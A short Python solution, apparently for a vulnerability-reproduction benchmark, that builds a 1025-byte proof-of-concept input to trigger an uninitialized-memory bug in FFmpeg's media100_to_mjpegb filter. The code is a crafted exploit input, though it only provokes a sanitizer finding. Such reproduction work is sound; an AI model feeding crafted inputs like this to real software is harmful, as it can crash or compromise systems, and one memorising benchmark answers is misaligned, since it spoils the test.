import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability in media100_to_mjpegb BSF.
        The vulnerability is an uninitialized memory use in the output padding.
        We construct a valid Media 100 frame to trigger the BSF execution and output packet generation.
        """
        # Ground truth length is 1025 bytes. We use this size to ensure reliability
        # in triggering the memory sanitizer issue (avoiding small-buffer allocator behaviors).
        size = 1025
        payload = bytearray(size)
        
        # Media 100 stream structure:
        # Bytes 4-7: Offset to the second field (Big Endian 32-bit integer).
        # We place the second field at offset 512.
        field2_offset = 512
        struct.pack_into('>I', payload, 4, field2_offset)
        
        # Emulate JPEG data start for Field 1 (usually after header, offset 8)
        # JPEG SOI marker: 0xFF 0xD8
        payload[8] = 0xFF
        payload[9] = 0xD8
        
        # Emulate JPEG data start for Field 2 (at field2_offset)
        payload[field2_offset] = 0xFF
        payload[field2_offset + 1] = 0xD8
        
        return bytes(payload)